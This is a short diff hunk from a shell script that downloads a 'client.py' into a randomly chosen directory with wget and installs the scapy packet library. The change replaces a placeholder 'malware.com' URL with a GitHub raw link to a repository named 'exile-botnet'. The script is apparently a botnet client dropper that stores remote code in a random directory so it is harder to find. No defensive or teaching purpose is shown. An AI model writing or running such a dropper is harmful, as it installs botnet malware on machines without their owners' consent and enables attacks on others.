@@ -13,7 +13,7 @@ random_index=$(( RANDOM % ${#directories[@]} ))
 random_directory=${directories[$random_index]}
 
 # download binary to directory
-wget -P "$random_directory" 'http://www.malware.com/client.py'
+wget -P "$random_directory" 'https://raw.githubusercontent.com/Lettable/exile-botnet/refs/heads/main/server%2Bclient/client.py'
 
 # install any dependencies
 pip3 install scapy.all
